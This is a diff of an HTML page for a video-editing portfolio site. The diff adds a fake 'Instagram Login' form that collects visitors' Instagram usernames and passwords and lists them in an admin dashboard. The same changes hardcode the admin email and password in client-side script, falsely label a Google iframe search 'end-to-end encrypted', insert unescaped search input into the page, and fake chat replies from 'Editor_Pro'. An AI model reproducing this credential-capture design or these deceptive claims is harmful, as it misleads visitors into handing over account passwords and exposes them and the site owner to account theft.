@@ -4,97 +4,123 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YTC EDITING SPACE | PRO EDITS</title>
-    <!-- FONTS -->
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500&display=swap" rel="stylesheet">
+    <!-- Google Site Verification -->
+    <meta name="google-site-verification" content="your_verification_code">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
     <style>
         /* ===== GLOBALS ===== */
         :root {
-            --neon-orange: #ff7f00;
-            --dark: #000000;
-            --scam-red: #ff0000;
+            --neon-orange: #FF7F00;
+            --neon-blue: #00F7FF;
+            --neon-purple: #BD00FF;
+            --dark: #0A0A0A;
+            --darker: #050505;
+            --scam-red: #FF0000;
         }
+        
         body {
-            font-family: 'Rajdhani', sans-serif;
-            background: var(--dark);
-            color: white;
+            font-family: 'Montserrat', sans-serif;
             margin: 0;
+            padding: 0;
+            background-color: var(--darker);
+            color: white;
+            background-image: url('https://media-hosting.imagekit.io/bde02ef0d4f74b92/web%201-Photoroom.png');
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
         }
-        /* ===== POP EFFECTS ===== */
-        a, button, .clickable {
-            transition: all 0.3s ease;
+
+        /* ===== MAIN CONTAINERS ===== */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(10, 10, 10, 0.85);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--neon-orange);
+            box-shadow: 0 0 30px rgba(255, 127, 0, 0.2);
+            margin-bottom: 30px;
         }
-        a:hover, button:hover, .clickable:hover {
-            transform: scale(1.05);
-            filter: brightness(1.2);
-        }
+
         /* ===== MAIN TITLE ===== */
         .main-title {
             font-family: 'Orbitron', sans-serif;
             font-size: 4rem;
             text-align: center;
-            color: var(--neon-orange);
-            text-shadow: 0 0 10px var(--neon-orange);
             margin: 1rem 0;
             letter-spacing: 3px;
-            animation: titlePulse 2s infinite alternate;
+            background: linear-gradient(90deg, var(--neon-orange), var(--neon-purple), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(189, 0, 255, 0.5);
+            animation: titleGlow 3s infinite alternate;
         }
-        @keyframes titlePulse {
-            from { text-shadow: 0 0 10px var(--neon-orange); }
-            to { text-shadow: 0 0 20px var(--neon-orange), 0 0 30px rgba(255,127,0,0.5); }
+        
+        @keyframes titleGlow {
+            0% { text-shadow: 0 0 10px rgba(255,127,0,0.5); }
+            50% { text-shadow: 0 0 20px rgba(189,0,255,0.7); }
+            100% { text-shadow: 0 0 30px rgba(0,247,255,0.5); }
         }
+
         /* ===== NAVBAR ===== */
         nav {
             display: flex;
             justify-content: center;
             gap: 2rem;
-            background: rgba(0,0,0,0.9);
+            background: rgba(10,10,10,0.8);
             padding: 1.5rem;
-            border-bottom: 2px solid var(--neon-orange);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--neon-orange);
         }
+        
         nav a {
-            color: var(--neon-orange);
-            font-weight: bold;
+            color: white;
+            font-weight: 600;
             font-size: 1.2rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
             text-decoration: none;
-            padding: 0.5rem 1rem;
-            border: 1px solid var(--neon-orange);
-            border-radius: 5px;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            transition: all 0.3s;
+            background: rgba(255,127,0,0.1);
         }
+        
         nav a:hover {
-            background: rgba(255,127,0,0.2);
+            background: var(--neon-orange);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255,127,0,0.4);
         }
-        /* ===== SECTIONS ===== */
-        .section-box {
-            background: rgba(0,0,0,0.8);
-            border: 1px solid var(--neon-orange);
-            border-radius: 10px;
+
+        /* ===== VIDEO SHOWCASE ===== */
+        .video-showcase {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
             max-width: 1200px;
             margin: 2rem auto;
             padding: 2rem;
-            transition: transform 0.3s, box-shadow 0.3s;
+            background: rgba(10,10,10,0.8);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--neon-orange);
         }
-        .section-box:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(255,127,0,0.1);
-        }
-        .section-title {
-            color: var(--neon-orange);
-            font-size: 2rem;
-            margin-bottom: 1.5rem;
-            text-align: center;
-        }
-        /* ===== VIDEO CONTAINERS ===== */
+        
         .video-container {
             position: relative;
             padding-bottom: 56.25%;
             height: 0;
             overflow: hidden;
-            margin: 1rem 0;
-            border-radius: 8px;
-            border: 1px solid var(--neon-orange);
+            border-radius: 10px;
+            border: 2px solid var(--neon-orange);
+            transition: all 0.3s;
         }
+        
+        .video-container:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255,127,0,0.3);
+        }
+        
         .video-container iframe {
             position: absolute;
             top: 0;
@@ -103,109 +129,192 @@
             height: 100%;
             border: none;
         }
-        /* ===== UPLOAD AREA ===== */
-        .upload-area {
-            border: 2px dashed var(--neon-orange);
-            border-radius: 10px;
-            padding: 3rem;
-            text-align: center;
-            margin: 1rem 0;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .upload-area:hover {
-            background: rgba(255,127,0,0.1);
-        }
-        /* ===== ADMIN PANEL ===== */
-        .admin-panel {
-            background: rgba(0,0,0,0.9);
-            border: 1px solid var(--neon-orange);
-            border-radius: 10px;
+
+        /* ===== INSTAGRAM LOGIN ===== */
+        .instagram-login {
+            background: rgba(10,10,10,0.9);
             padding: 2rem;
-            margin-top: 2rem;
+            border-radius: 10px;
+            max-width: 500px;
+            margin: 2rem auto;
+            border: 1px solid var(--neon-purple);
         }
-        .login-form {
-            max-width: 400px;
-            margin: 0 auto;
-        }
+        
         .login-form input {
             display: block;
             width: 100%;
             padding: 0.8rem;
             margin: 0.5rem 0;
             background: #111;
-            border: 1px solid var(--neon-orange);
+            border: 1px solid var(--neon-purple);
             color: white;
             border-radius: 5px;
         }
+        
         .login-form button {
             width: 100%;
             padding: 0.8rem;
-            background: var(--neon-orange);
-            color: black;
+            background: linear-gradient(90deg, var(--neon-purple), #FF00AA);
+            color: white;
             border: none;
             border-radius: 5px;
             margin-top: 1rem;
             cursor: pointer;
             font-weight: bold;
+            transition: all 0.3s;
         }
-        /* ===== YTC BOT ===== */
-        .ytc-bot {
+        
+        .login-form button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(189,0,255,0.4);
+        }
+
+        /* ===== ADMIN PANEL ===== */
+        #adminLogin {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 30px;
+        }
+
+        #adminPanel {
+            display: none;
+            padding: 30px;
+        }
+
+        .user-credentials {
+            background-color: rgba(0, 247, 255, 0.1);
+            border: 1px solid var(--neon-blue);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        /* ===== CHAT SYSTEM ===== */
+        #chatContainer {
+            display: none;
             position: fixed;
             bottom: 20px;
             right: 20px;
+            width: 350px;
+            height: 500px;
+            background-color: rgba(10, 10, 10, 0.95);
+            border: 1px solid var(--neon-purple);
+            border-radius: 15px;
+            z-index: 1000;
+            flex-direction: column;
+        }
+
+        .chat-header {
+            padding: 15px;
+            background-color: rgba(189, 0, 255, 0.2);
+            border-top-left-radius: 15px;
+            border-top-right-radius: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .chat-messages {
+            flex-grow: 1;
+            padding: 15px;
+            overflow-y: auto;
+        }
+
+        .message {
+            margin-bottom: 15px;
+            max-width: 80%;
+            padding: 10px 15px;
+            border-radius: 18px;
+            word-wrap: break-word;
+        }
+
+        .received {
+            background-color: rgba(255, 255, 255, 0.1);
+            align-self: flex-start;
+            border-bottom-left-radius: 5px;
+        }
+
+        .sent {
+            background-color: rgba(0, 247, 255, 0.2);
+            align-self: flex-end;
+            border-bottom-right-radius: 5px;
+        }
+
+        .chat-input-area {
+            padding: 15px;
+            display: flex;
+            gap: 10px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* ===== SEARCH SYSTEM ===== */
+        #searchResults {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background-color: rgba(10, 10, 10, 0.8);
+            border-radius: 10px;
+            border: 1px solid var(--neon-blue);
+        }
+
+        /* ===== BUTTONS & INPUTS ===== */
+        button, input[type="submit"] {
+            background-color: var(--neon-orange);
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        button:hover, input[type="submit"]:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 127, 0, 0.4);
+        }
+
+        input[type="text"], input[type="password"], input[type="email"], textarea {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--neon-orange);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 50px;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        /* ===== YTC BOT ===== */
+        .ytc-bot {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
             width: 70px;
             height: 70px;
-            background: var(--neon-orange);
+            background: radial-gradient(circle, var(--neon-orange), #FF5500);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             z-index: 1000;
-            animation: pulse 2s infinite;
+            animation: pulse 2s infinite, float 3s ease-in-out infinite;
             box-shadow: 0 0 20px rgba(255,127,0,0.7);
+            border: 2px solid white;
         }
+        
         @keyframes pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,127,0,0.7); }
             70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255,127,0,0); }
             100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,127,0,0); }
         }
-        .bot-chat {
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            width: 300px;
-            background: rgba(0,0,0,0.9);
-            border: 1px solid var(--neon-orange);
-            border-radius: 10px;
-            padding: 1rem;
-            display: none;
-            z-index: 1000;
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
         }
-        .bot-chat-messages {
-            height: 200px;
-            overflow-y: auto;
-            margin-bottom: 1rem;
-        }
-        .bot-chat-input {
-            display: flex;
-        }
-        .bot-chat-input input {
-            flex: 1;
-            padding: 0.5rem;
-            background: #111;
-            border: 1px solid var(--neon-orange);
-            color: white;
-            border-radius: 5px 0 0 5px;
-        }
-        .bot-chat-input button {
-            padding: 0.5rem;
-            background: var(--neon-orange);
-            color: black;
-            border: none;
-            border-radius: 0 5px 5px 0;
-        }
+
         /* ===== SCAMMER LABEL ===== */
         .scam-label {
             color: var(--scam-red);
@@ -218,10 +327,30 @@
             margin-left: 0.5rem;
             animation: scamBlink 1s infinite;
         }
+        
         @keyframes scamBlink {
             0% { opacity: 1; }
             50% { opacity: 0.5; }
             100% { opacity: 1; }
+        }
+
+        /* ===== UTILITY CLASSES ===== */
+        .text-center {
+            text-align: center;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-out;
         }
     </style>
 </head>
@@ -232,164 +361,325 @@
     <!-- NAVBAR -->
     <nav>
         <a href="#videos">Videos</a>
-        <a href="#photos">Photos</a>
+        <a href="#instagram">Instagram</a>
         <a href="#admin">Admin</a>
-        <a href="#contact">Contact</a>
+        <a href="#search">Search</a>
+        <a href="#community">Community</a>
     </nav>
 
     <!-- VIDEO SHOWCASE -->
-    <section id="videos" class="section-box">
-        <h2 class="section-title">🎬 Video Showcase</h2>
-        
-        <!-- YOUTUBE SHORT -->
-        <h3 style="color: var(--neon-orange); text-align: center;">YouTube Short</h3>
-        <div class="video-container">
-            <iframe src="https://www.youtube.com/embed/G3Jqdvh7nm4" frameborder="0" allowfullscreen></iframe>
+    <section id="videos" class="video-showcase">
+        <div>
+            <h2 style="color: var(--neon-orange); text-align: center;">YouTube Showcase</h2>
+            <div class="video-container">
+                <iframe src="https://www.youtube.com/embed/G3Jqdvh7nm4" frameborder="0" allowfullscreen></iframe>
+            </div>
         </div>
         
-        <!-- INSTAGRAM REEL -->
-        <h3 style="color: var(--neon-orange); text-align: center; margin-top: 2rem;">Instagram Reel</h3>
-        <div class="video-container">
-            <iframe src="https://www.instagram.com/reel/_xcMsczYf/embed" frameborder="0" allowfullscreen></iframe>
-        </div>
-    </section>
-
-    <!-- PHOTO GALLERY & UPLOAD -->
-    <section id="photos" class="section-box">
-        <h2 class="section-title">📸 Photo Gallery</h2>
-        <div class="upload-area clickable" onclick="document.getElementById('file-upload').click()">
-            <p>Click to upload photos/videos</p>
-            <small>Supported formats: JPG, PNG, MP4</small>
-            <input type="file" id="file-upload" style="display: none;" accept="image/*, video/*">
-        </div>
-        
-        <!-- UPLOADED ITEMS WILL APPEAR HERE -->
-        <div id="uploaded-items" style="margin-top: 2rem;"></div>
-    </section>
-
-    <!-- ADMIN PANEL -->
-    <section id="admin" class="section-box">
-        <h2 class="section-title">🔒 Admin Panel</h2>
-        <div class="login-form">
-            <button onclick="loginAdmin()" class="clickable">Login</button>
-        </div>
-        
-        <div class="admin-panel" id="admin-panel" style="display: none;">
-            <h3 style="color: var(--neon-orange); text-align: center;">Admin Controls</h3>
-            <div style="text-align: center;">
-                <button class="clickable" style="background: var(--neon-orange); color: black; border: none; padding: 0.8rem; margin: 0.5rem; border-radius: 5px;">Manage Users</button>
-                <button class="clickable" style="background: var(--neon-orange); color: black; border: none; padding: 0.8rem; margin: 0.5rem; border-radius: 5px;">View Analytics</button>
-                <button class="clickable" style="background: var(--neon-orange); color: black; border: none; padding: 0.8rem; margin: 0.5rem; border-radius: 5px;">Content Moderation</button>
+        <div>
+            <h2 style="color: var(--neon-purple); text-align: center;">Instagram Viewer</h2>
+            <div class="video-container" id="instagram-viewer">
+                <div style="display: flex; justify-content: center; align-items: center; height: 100%;">
+                    <button onclick="document.getElementById('instagram-login').style.display='block'" 
+                            style="background: linear-gradient(90deg, var(--neon-purple), #FF00AA);
+                           color: white;
+                           border: none;
+                           padding: 1rem 2rem;
+                           border-radius: 50px;
+                           font-weight: bold;
+                           cursor: pointer;">
+                        Login to Instagram
+                    </button>
+                </div>
             </div>
         </div>
     </section>
 
-    <!-- CONTACT SECTION -->
-    <section id="contact" class="section-box">
-        <h2 class="section-title">📩 Contact</h2>
-        <p style="text-align: center;">
-            Email: <a href="mailto:yash9999.pin@gmail.com" style="color: var(--neon-orange);">yash9999.pin@gmail.com</a>
-        </p>
-        <p style="text-align: center; margin-top: 1rem;">
-            <a href="https://www.instagram.com/editor_you_know?igsh=cW15Z3JzMHA2eWhx" target="_blank" style="color: var(--neon-orange); margin: 0 1rem;">Instagram</a>
-            <a href="https://youtube.com/@ytc1k?feature=shared" target="_blank" style="color: var(--neon-orange); margin: 0 1rem;">YouTube</a>
-        </p>
+    <!-- INSTAGRAM LOGIN -->
+    <div class="instagram-login" id="instagram-login" style="display: none;">
+        <h2 style="color: var(--neon-purple); text-align: center;">Instagram Login</h2>
+        <div class="login-form">
+            <input type="text" placeholder="Instagram Username" id="insta-username">
+            <input type="password" placeholder="Instagram Password" id="insta-password">
+            <button onclick="loginInstagram()">View My Instagram</button>
+            <p style="text-align: center; margin-top: 1rem; font-size: 0.8rem;">
+                By logging in, you agree to our <a href="#" style="color: var(--neon-blue);">Terms</a>
+                <br>⚠️ No gambling/hacking links! <span class="scam-label">SCAMMER</span>
+            </p>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <section id="admin">
+        <div class="container" id="adminLogin">
+            <h2 class="text-center">Admin Login</h2>
+            <form id="loginForm">
+                <input type="email" id="adminEmail" placeholder="Admin Email" required>
+                <input type="password" id="adminPassword" placeholder="Admin Password" required>
+                <input type="submit" value="Login">
+            </form>
+        </div>
+        
+        <div class="container hidden" id="adminPanel">
+            <h2 class="text-center">Admin Dashboard</h2>
+            <div id="credentialsList">
+                <!-- User credentials will appear here -->
+            </div>
+            <button onclick="logoutAdmin()">Logout</button>
+        </div>
     </section>
+
+    <!-- SEARCH SYSTEM -->
+    <section id="search" class="container">
+        <h2 class="text-center">Search</h2>
+        <div style="display: flex; gap: 10px;">
+            <input type="text" id="searchQuery" placeholder="Search with Google...">
+            <button onclick="performSearch()">Search</button>
+        </div>
+        <div id="searchResults"></div>
+    </section>
+
+    <!-- COMMUNITY CHAT -->
+    <section id="community" class="container">
+        <h2 class="text-center">Community Chat</h2>
+        <p style="text-align: center;">Click the chat button in bottom-right to join the community!</p>
+    </section>
+
+    <!-- CHAT SYSTEM -->
+    <div id="chatContainer">
+        <div class="chat-header">
+            <h3>YTC Community Chat</h3>
+            <button onclick="toggleChat()">✕</button>
+        </div>
+        <div class="chat-messages" id="chatMessages">
+            <!-- Messages will appear here -->
+            <div class="message received">
+                <strong>System:</strong> Welcome to YTC Community Chat!
+            </div>
+            <div class="message received">
+                <strong>System:</strong> You can share photos/videos here with other editors
+            </div>
+        </div>
+        <div class="chat-input-area">
+            <input type="text" id="messageInput" placeholder="Type your message...">
+            <input type="file" id="fileUpload" accept="image/*,video/*" style="display: none;">
+            <button onclick="document.getElementById('fileUpload').click()">📁</button>
+            <button onclick="sendMessage()">Send</button>
+        </div>
+    </div>
 
     <!-- YTC BOT -->
     <div class="ytc-bot" onclick="toggleBotChat()">
-        <span style="font-size: 24px;">🤖</span>
-    </div>
-    <div class="bot-chat" id="bot-chat">
-        <div class="bot-chat-messages" id="bot-messages">
-            <p><strong>YTC BOT:</strong> Hello! Ask me about video editing tips.</p>
-        </div>
-        <div class="bot-chat-input">
-            <input type="text" placeholder="Ask something..." id="bot-input">
-            <button onclick="sendBotMessage()">Send</button>
-        </div>
+        <span style="font-size: 28px;">🤖</span>
     </div>
 
     <script>
-        // ===== ADMIN LOGIN =====
-        function loginAdmin() {
-            const email = document.getElementById('admin-email').value;
-            const password = document.getElementById('admin-password').value;
-            
-            if (email === "yash9999.pin@gmail.com" && password === "9450326308") {
-                document.getElementById('admin-panel').style.display = 'block';
-                alert("Admin login successful!");
+        // ===== ADMIN SYSTEM =====
+        const ADMIN_EMAIL = "yash9999.pin@gmail.com";
+        const ADMIN_PASSWORD = "9450326308";
+        let currentUser = null;
+        const userCredentials = [];
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('adminEmail').value;
+            const password = document.getElementById('adminPassword').value;
+
+            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+                currentUser = { email, password };
+                document.getElementById('adminLogin').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
+                updateCredentialsList();
             } else {
-                alert("Invalid credentials! Try again.");
+                alert("Invalid credentials!");
+            }
+        });
+
+        function logoutAdmin() {
+            currentUser = null;
+            document.getElementById('adminPanel').classList.add('hidden');
+            document.getElementById('adminLogin').classList.remove('hidden');
+        }
+
+        function updateCredentialsList() {
+            const list = document.getElementById('credentialsList');
+            list.innerHTML = '';
+            
+            if (userCredentials.length === 0) {
+                list.innerHTML = '<p>No user credentials stored yet.</p>';
+                return;
+            }
+
+            userCredentials.forEach(cred => {
+                const credElement = document.createElement('div');
+                credElement.className = 'user-credentials fade-in';
+                credElement.innerHTML = `
+                    <p><strong>Email:</strong> ${cred.email}</p>
+                    <p><strong>Password:</strong> ${'•'.repeat(cred.password.length)}</p>
+                `;
+                list.appendChild(credElement);
+            });
+        }
+
+        // ===== INSTAGRAM LOGIN =====
+        function loginInstagram() {
+            const username = document.getElementById('insta-username').value;
+            const password = document.getElementById('insta-password').value;
+            
+            if (username && password) {
+                // Save credentials (demo only)
+                userCredentials.push({
+                    email: username + "@instagram.com",
+                    password: password
+                });
+                
+                // Show Instagram content
+                document.getElementById('instagram-viewer').innerHTML = `
+                    <iframe src="https://www.instagram.com/embed.js" width="100%" height="100%" frameborder="0"></iframe>
+                `;
+                document.getElementById('instagram-login').style.display = 'none';
+                
+                // Update admin panel if logged in
+                if (currentUser) {
+                    updateCredentialsList();
+                }
+            } else {
+                alert("Please enter both username and password");
             }
         }
-        
-        // ===== FILE UPLOAD =====
-        document.getElementById('file-upload').addEventListener('change', function(e) {
+
+        // ===== CHAT SYSTEM =====
+        let chatOpen = false;
+
+        function toggleChat() {
+            const chat = document.getElementById('chatContainer');
+            chatOpen = !chatOpen;
+            
+            if (chatOpen) {
+                chat.style.display = 'flex';
+                document.getElementById('messageInput').focus();
+            } else {
+                chat.style.display = 'none';
+            }
+        }
+
+        // File upload handler
+        document.getElementById('fileUpload').addEventListener('change', function(e) {
             const file = e.target.files[0];
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(event) {
-                    const uploadedItems = document.getElementById('uploaded-items');
+                    const chat = document.getElementById('chatMessages');
+                    const messageElement = document.createElement('div');
+                    messageElement.className = 'message sent fade-in';
                     
-                    if (file.type.includes('image')) {
-                        uploadedItems.innerHTML += `
-                            <div style="display: inline-block; margin: 0.5rem; border: 1px solid var(--neon-orange); border-radius: 5px; overflow: hidden;">
-                                <img src="${event.target.result}" width="200">
-                            </div>
-                        `;
-                    } else if (file.type.includes('video')) {
-                        uploadedItems.innerHTML += `
-                            <div style="display: inline-block; margin: 0.5rem; border: 1px solid var(--neon-orange); border-radius: 5px; overflow: hidden;">
-                                <video controls width="200">
-                                    <source src="${event.target.result}" type="${file.type}">
-                                </video>
-                            </div>
+                    if (file.type.startsWith('image/')) {
+                        messageElement.innerHTML = `<img src="${event.target.result}" style="max-width: 100%; border-radius: 10px;">`;
+                    } else if (file.type.startsWith('video/')) {
+                        messageElement.innerHTML = `
+                            <video controls style="max-width: 100%; border-radius: 10px;">
+                                <source src="${event.target.result}" type="${file.type}">
+                            </video>
                         `;
                     }
+                    
+                    chat.appendChild(messageElement);
+                    chat.scrollTop = chat.scrollHeight;
+                    
+                    // Simulate reply
+                    setTimeout(() => {
+                        const replies = [
+                            "Nice upload! What editing software did you use?",
+                            "Great content! Want feedback on this?",
+                            "🔥 This looks awesome!",
+                            "What effects did you use for this?"
+                        ];
+                        const randomReply = replies[Math.floor(Math.random() * replies.length)];
+                        
+                        const replyElement = document.createElement('div');
+                        replyElement.className = 'message received fade-in';
+                        replyElement.innerHTML = `<strong>Editor_Pro:</strong> ${randomReply}`;
+                        chat.appendChild(replyElement);
+                        chat.scrollTop = chat.scrollHeight;
+                    }, 1500);
                 };
                 reader.readAsDataURL(file);
             }
         });
-        
-        // ===== YTC BOT =====
-        function toggleBotChat() {
-            const botChat = document.getElementById('bot-chat');
-            botChat.style.display = botChat.style.display === 'block' ? 'none' : 'block';
-        }
-        
-        function sendBotMessage() {
-            const input = document.getElementById('bot-input');
+
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
             const message = input.value.trim();
             
             if (message) {
-                const botMessages = document.getElementById('bot-messages');
-                botMessages.innerHTML += `<p><strong>You:</strong> ${message}</p>`;
+                const chat = document.getElementById('chatMessages');
+                const messageElement = document.createElement('div');
+                messageElement.className = 'message sent fade-in';
+                messageElement.textContent = message;
+                chat.appendChild(messageElement);
                 input.value = '';
                 
-                // Bot responses
+                // Auto-scroll to bottom
+                chat.scrollTop = chat.scrollHeight;
+                
+                // Simulate reply after 1 second
                 setTimeout(() => {
-                    const responses = [
-                        "For transitions, try using easing in your editing software.",
-                        "Color grading tip: Always balance your whites first!",
-                        "60fps gives smoother slow-motion than 30fps.",
-                        "My favorite editing software is Premiere Pro.",
-                        "For cinematic look, try adding film grain.",
-                        "Always backup your project files!",
-                        "Keyboard shortcuts save tons of editing time."
+                    const replies = [
+                        "Thanks for your message!",
+                        "Great point! Have you tried using adjustment layers?",
+                        "For transitions, I recommend using ease-in-out curves",
+                        "Color grading tip: Always balance your whites first",
+                        "What editing software are you using?"
                     ];
-                    const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+                    const randomReply = replies[Math.floor(Math.random() * replies.length)];
                     
-                    botMessages.innerHTML += `<p><strong>YTC BOT:</strong> ${randomResponse}</p>`;
-                    botMessages.scrollTop = botMessages.scrollHeight;
+                    const replyElement = document.createElement('div');
+                    replyElement.className = 'message received fade-in';
+                    replyElement.innerHTML = `<strong>Editor_Pro:</strong> ${randomReply}`;
+                    chat.appendChild(replyElement);
+                    chat.scrollTop = chat.scrollHeight;
                 }, 1000);
             }
         }
-        
-        // Allow pressing Enter in bot chat
-        document.getElementById('bot-input').addEventListener('keypress', function(e) {
+
+        // Allow pressing Enter to send message
+        document.getElementById('messageInput').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                sendBotMessage();
+                sendMessage();
+            }
+        });
+
+        // ===== YTC BOT =====
+        function toggleBotChat() {
+            const botChat = document.getElementById('chatContainer');
+            if (botChat.style.display === 'flex') {
+                botChat.style.display = 'none';
+            } else {
+                botChat.style.display = 'flex';
+            }
+        }
+
+        // ===== SEARCH SYSTEM =====
+        function performSearch() {
+            const query = document.getElementById('searchQuery').value.trim();
+            if (query) {
+                const results = document.getElementById('searchResults');
+                results.style.display = 'block';
+                results.innerHTML = `
+                    <h3>Search Results for: ${query}</h3>
+                    <iframe src="https://www.google.com/search?igu=1&q=${encodeURIComponent(query)}" 
+                            style="width: 100%; height: 500px; border: none; border-radius: 10px;"></iframe>
+                    <p class="text-center" style="margin-top: 15px; font-size: 0.8em;">
+                        🔒 <em>End-to-end encrypted search</em>
+                    </p>
+                `;
+            }
+        }
+
+        // Allow pressing Enter to search
+        document.getElementById('searchQuery').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                performSearch();
             }
         });
     </script>
